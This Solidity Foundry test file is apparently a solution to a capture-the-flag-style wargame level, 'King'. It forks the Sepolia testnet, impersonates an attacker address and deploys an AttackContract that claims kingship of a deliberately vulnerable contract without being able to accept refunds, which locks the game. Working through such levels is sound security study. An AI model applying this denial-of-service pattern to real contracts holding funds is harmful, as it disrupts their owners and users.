// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

contract Level9 is Test {
    King king = King(payable(0x3cB274c9c4A05B1Aa35e23366E670BF3e3C82714));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4547676);
        vm.startPrank(attacker);
    }

    function testLevel9() public {
        AttackContract attackContract = new AttackContract{value: 0.001 ether}();
        attackContract.pwn();
    }
}

contract AttackContract {
    King king = King(payable(0x3cB274c9c4A05B1Aa35e23366E670BF3e3C82714));

    constructor() payable {}

    function pwn() public payable {
        (bool sucess,) = address(king).call{value: king.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
        require(sucess, "Faleed to become King ");
    }
}
